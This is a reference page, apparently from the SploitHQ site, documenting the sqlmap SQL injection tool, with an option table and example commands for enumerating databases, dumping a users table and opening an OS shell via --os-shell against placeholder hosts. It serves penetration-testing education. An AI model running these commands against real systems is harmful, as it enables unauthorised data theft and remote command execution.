# sqlmap – Automated SQL Injection Tool

**sqlmap** is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws. It supports a wide range of databases and can perform everything from data extraction to remote code execution.

🔗 [Use the SQLMap Command Generator on SploitHQ](https://sploithq.com/sqlmap)

---

## 🔍 What Can sqlmap Do?

- Detect and exploit SQL injection vulnerabilities
- Enumerate databases, tables, and columns
- Extract data, credentials, and file contents
- Read/write local files via SQL injection
- Execute OS commands on vulnerable systems
- Support GET, POST, cookies, headers, and custom injection points

---

## ⚙️ Basic Usage

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

This tests the `id` parameter in the URL for SQL injection vulnerabilities.

---

## 🧰 Commonly Used Options

| Option                       | Description                                                |
|------------------------------|------------------------------------------------------------|
| `-u <url>`                   | Target URL with injection point                            |
| `--data "<payload>"`         | POST data for testing form parameters                      |
| `--cookie "<cookie>"`        | Supply cookies manually                                    |
| `--level <1-5>`              | Number of tests per parameter (default: 1)                 |
| `--risk <1-3>`               | Risk of tests (default: 1)                                 |
| `--dbs`                      | Enumerate databases                                        |
| `--tables -D <db>`           | List tables from a specific database                      |
| `--columns -D <db> -T <tbl>` | List columns in a specific table                          |
| `--dump -D <db> -T <tbl>`    | Dump data from a table                                     |
| `--os-shell`                 | Spawn a basic OS shell via SQLi                           |
| `--batch`                    | Skip confirmation prompts (useful for automation)          |

---

## 🧪 Examples

### Test a simple GET parameter
```bash
sqlmap -u "http://testsite.com/product.php?id=3"
```

### Test a form with POST data
```bash
sqlmap -u "http://testsite.com/login.php" --data="username=admin&password=123"
```

### Use a specific cookie
```bash
sqlmap -u "http://target.com/profile" --cookie="auth=abc123"
```

### List databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

### Dump all user data from a table
```bash
sqlmap -u "http://target.com/?id=1" --dump -D usersdb -T users
```

### Get an interactive OS shell
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

---

## ⚠️ Notes

- Always get **explicit permission** before testing websites or applications.
- sqlmap is extremely powerful and can cause database disruptions.
- Use `--batch` for automated tools and scripts.

---

## 🌐 Live Command Generator

Build SQLMap commands without memorizing flags.

👉 [Use the SQLMap Generator on SploitHQ](https://sploithq.com/sqlmap)

- Select method: GET, POST, Cookie, Header
- Choose action: enumerate, dump, shell
- Auto-generate and copy your command

---

## 🔗 Useful Links

- [sqlmap Official Site](https://sqlmap.org/)
- [sqlmap GitHub Repository](https://github.com/sqlmapproject/sqlmap)
- [sqlmap Man Page (die.net)](https://linux.die.net/man/1/sqlmap)
- [SploitHQ SQLMap Tool](https://sploithq.com/sqlmap)

---

## 📄 License

sqlmap is open-source software licensed under the [GPL v2.0](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html).

This page is maintained by [SploitHQ](https://sploithq.com) and is not affiliated with the sqlmap developers.
